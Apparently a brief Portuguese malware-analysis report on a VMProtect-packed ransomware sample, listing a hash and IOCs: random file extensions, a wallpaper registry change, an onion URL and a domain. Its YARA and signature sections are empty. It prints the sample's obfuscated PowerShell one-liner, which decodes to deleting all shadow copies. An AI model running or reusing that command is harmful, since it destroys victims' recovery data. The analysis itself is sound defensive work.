SHA256: 4098b54c9d27b00ce34d04ffac24213ed28993a2854827851b157d63407c2e4e

Objetivo 1: Exemplos de informações relevantes: arquivos procurados, alterações no sistema, compilador, c2, diretórios ignorados, e tudo mais que achar relevante.
    Encontrado Protector/Packer: VMProtect(1.60-2.05)
    Encontrado Linker: Microsoft Linker(14.12)

IOC BEHAVIOR
    Inclui 8 caracteres aleatorios na extensão dos arquivos
    Altera o WallPaper da area de trabalho via "Windows Registry" -> \REGISTRY\USER\S-1-5-21-XXXX\Control Panel\Desktop\WallPaper
    Spawn PowerShell com CommanLine malicioso -> powershell -ep bypass -c "(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s"
    Spawn VSSVC
    
IOC URL
    hxxp://darksidfqzcuhtk2[.]onion

IOC DOMAIN
    securebestapp20[.]com

Objetivo 2: Regra Yara para detectar o sample

Objetivo 3: Assinatura hipotética baseada em uma sequência de comportamentos, 


Ferramentas utilizadas:
    Detect It Easy
